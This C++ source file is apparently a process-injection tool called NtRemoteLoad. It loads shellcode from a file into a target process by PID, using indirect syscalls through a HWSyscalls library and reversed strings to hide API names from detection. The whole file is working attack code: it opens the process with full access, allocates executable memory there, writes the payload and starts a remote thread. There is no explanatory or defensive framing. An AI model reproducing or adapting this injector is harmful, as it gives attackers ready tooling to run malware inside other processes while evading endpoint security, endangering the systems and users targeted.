#include <iostream>
#include "HWSyscalls.h"
#include <fstream>

#define KEY 0xb6
#define SIZEOF(x) sizeof(x) - 1

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;




typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
	HANDLE             ProcessHandle,
	PVOID* BaseAddress,
	ULONG              ZeroBits,
	PULONG             RegionSize,
	ULONG              AllocationType,
	ULONG              Protect
	);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PULONG           NumberOfBytesToProtect,
	IN ULONG                NewAccessProtection,
	OUT PULONG              OldAccessProtection
);

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(
	IN PVOID ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG Reserved
	);


typedef NTSTATUS(NTAPI* NtReadFile_t)(
	IN    HANDLE           FileHandle,
	IN OPTIONAL HANDLE           Event,
	IN OPTIONAL PIO_APC_ROUTINE  ApcRoutine,
	IN OPTIONAL PVOID            ApcContext,
	OUT    PIO_STATUS_BLOCK IoStatusBlock,
	OUT    PVOID            Buffer,
	IN     ULONG            Length,
	IN OPTIONAL PLARGE_INTEGER   ByteOffset,
	IN OPTIONAL PULONG           Key
	);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
	IN HANDLE pHandle,
	IN PVOID baseAddress,
	IN LPCVOID lpBuffer,
	IN SIZE_T nSize,
	OUT SIZE_T* lpNumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* NtWaitForSingleObject)(
	IN HANDLE Handle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Timeout
	);

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

void reverseStr(char* str, int nSize)
{

	// Swap character starting from two
	// corners
	for (int i = 0; i < nSize / 2; i++)
		std::swap(str[i], str[nSize - i - 1]);
	return;
}


char cNtAllocateVirtualMemory[] = "yromeMlautriVetacollAtN";
char cNtCreateThreadEx[] = "xEdaerhTetaerCtN";
char cNtWaitForSingleObject[] = "tcejbOelgniSroFtiaWtN";

int main(int argc, char* argv[]) {



	if (argc != 3) {
		printf("\n  [ usage: NtRemoteLoad.exe <file.bin> <PID>\n");
		return 0;
	}

	if (!InitHWSyscalls())
		return -1;

	char cNtReadFile[] = "eliFdaeRtN";
	char cNtProtectVirtualMemory[] = "yromeMlautriVtcetorPtN";
	char cNtWriteVirtualMemory[] = "yromeMlautriVetirWtN";
	char cNtOpenProcess[] = "ssecorPnepOtN";

	//start
	NTSTATUS status;
	// 1: Open handle to file for reading
	LPVOID payload = NULL;
	HANDLE hFile;
	SIZE_T payload_len;
	
	hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	payload_len = GetFileSize(hFile, NULL);
	if (payload_len == 0) {
		return -1;
	}

	
	HANDLE hThread = NULL;

	HANDLE hproc = (HANDLE)-1; //handle to current process
	

	
	
	// allocate memory for shellcode
	reverseStr(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory));
	NtAllocateVirtualMemory_t allocvirtualmemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char*)cNtAllocateVirtualMemory);
	allocvirtualmemory(hproc, &payload, 0, (PULONG)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	

	// write shellcode to memory allocated
	IO_STATUS_BLOCK ioBlock;
	reverseStr(cNtReadFile, SIZEOF(cNtReadFile));
	NtReadFile_t readfile = (NtReadFile_t)PrepareSyscall((char*)cNtReadFile);
	readfile(hFile, NULL, NULL, NULL, &ioBlock, payload, (DWORD)payload_len, NULL, NULL);
	

	//open handle to remote process
	int pid = atoi(argv[2]);
	OBJECT_ATTRIBUTES objAttr;
	HANDLE hProcess;
	CLIENT_ID cID;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cID.UniqueProcess = (PVOID)pid;
	cID.UniqueThread = 0;
	reverseStr(cNtOpenProcess, SIZEOF(cNtOpenProcess));
	NtOpenProcess_t openprocess = (NtOpenProcess_t)PrepareSyscall((char*) cNtOpenProcess);
	openprocess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cID);
	if (!hProcess) {
		printf("Failed to open process");
		return -1;
	}
		

	

	//Allocate remote memory
	LPVOID allocation_start = nullptr;
	status = allocvirtualmemory(hProcess, &allocation_start, 0, (PULONG)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	//write remote shellcode
	reverseStr(cNtWriteVirtualMemory, SIZEOF(cNtWriteVirtualMemory));
	NtWriteVirtualMemory_t writememory = (NtWriteVirtualMemory_t)PrepareSyscall((char*)cNtWriteVirtualMemory);
	status = writememory(hProcess, allocation_start, (PVOID)payload, payload_len, 0);

	//create thread from shellcode
	reverseStr(cNtCreateThreadEx, SIZEOF(cNtCreateThreadEx));
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscall((char*)cNtCreateThreadEx);
	status = pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)allocation_start, NULL, NULL, NULL, NULL, NULL, NULL);

	CloseHandle(hproc);
	CloseHandle(hProcess);

	if (DeinitHWSyscalls())
		std::cout << "All good :D" << std::endl;
	else
		std::cerr << "Something went wrong :d" << std::endl;
	

	return 0;
}
